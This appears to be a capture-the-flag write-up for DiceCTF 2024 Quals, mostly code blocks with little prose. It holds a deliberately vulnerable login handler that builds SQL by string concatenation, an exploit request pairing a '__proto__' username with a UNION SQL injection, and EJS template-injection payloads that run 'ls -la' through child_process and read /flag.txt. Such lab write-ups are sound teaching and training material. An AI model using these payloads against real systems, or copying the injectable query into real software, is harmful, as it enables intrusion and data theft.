# DiceCTF 2024 Quals Writeups

> 原文: https://www.ctfiot.com/160792.html
> ID: 160792


```
function win(history) {
 const code = encode(history) + ";" + prompt("Name?");

 const saveURL = location.origin + "?code=" + code;
 displaywrapper.classList.remove("hidden");

 const score = history.length;

 display.children[1].innerHTML = "Your score was: <b>" + score + "</b>";
 display.children[2].href =
 "https://twitter.com/intent/tweet?text=" +
 encodeURIComponent(
 "Can you beat my score of " + score + " in Dice Dice Goose?",
 ) +
 "&url=" +
 encodeURIComponent(saveURL);

 if (score === 9) log("flag: dice{pr0_duck_gam3r_" + encode(history) + "}");
 }
```



```
let player = [0, 1];
 let goose = [9, 9];
```



```
function encode(history) {
 const data = new Uint8Array(history.length * 4);

 let idx = 0;
 for (const part of history) {
 data[idx++] = part[0][0];
 data[idx++] = part[0][1];
 data[idx++] = part[1][0];
 data[idx++] = part[1][1];
 }

 let prev = String.fromCharCode.apply(null, data);
 let ret = btoa(prev);
 return ret;
 }

let player = [0, 1];
let goose = [9, 9];

let history = [];
history.push([structuredClone(player), structuredClone(goose)]);

for (let i = 0; i < 8; i++) {
 player[0]++;
 goose[1]--;
 history.push([structuredClone(player), structuredClone(goose)]);
}

console.log("flag: dice{pr0_duck_gam3r_" + encode(history) + "}");
```



```
const users = [...Array(100_000)].map(() => ({ user: `user-${crypto.randomUUID()}`, pass: crypto.randomBytes(8).toString("hex") }));
db.exec(`INSERT INTO users (id, username, password) VALUES ${users.map((u,i) => `(${i}, '${u.user}', '${u.pass}')`).join(", ")}`);

const isAdmin = {};
const newAdmin = users[Math.floor(Math.random() * users.length)];
isAdmin[newAdmin.user] = true;
```



```
app.post("/api/login", (req, res) => {
 const { user, pass } = req.body;

 const query = `SELECT id FROM users WHERE username = '${user}' AND password = '${pass}';`;
 try {
 const id = db.prepare(query).get()?.id;
 if (!id) {
 return res.redirect("/?message=Incorrect username or password");
 }

 if (users[id] && isAdmin[user]) {
 return res.redirect("/?flag=" + encodeURIComponent(FLAG));
 }
 return res.redirect("/?message=This system is currently only available to admins...");
 }
 catch {
 return res.redirect("/?message=Nice try...");
 }
});
```



```
> const isAdmin = {};
undefined
> isAdmin['__proto__']
[Object: null prototype] {}
```



```
POST /api/login HTTP/2
Host: funnylogin.mc.ax
Content-Length: 43
Content-Type: application/x-www-form-urlencoded

user=__proto__&pass='%20union%20select%20'1
```



```
print R

please ignore the followings

<%- global.process.mainModule.require('child_process').execSync('ls -la') %>
```



```
TypeError: ejs:5
 3| please ignore the followings
 4| 
 >> 5| <%- global.process.mainModule.require('child_process').execSync('ls -la') %>

Cannot read properties of undefined (reading 'require')
```



```
print R

please ignore the followings

<%- include('/flag.txt') %>
```
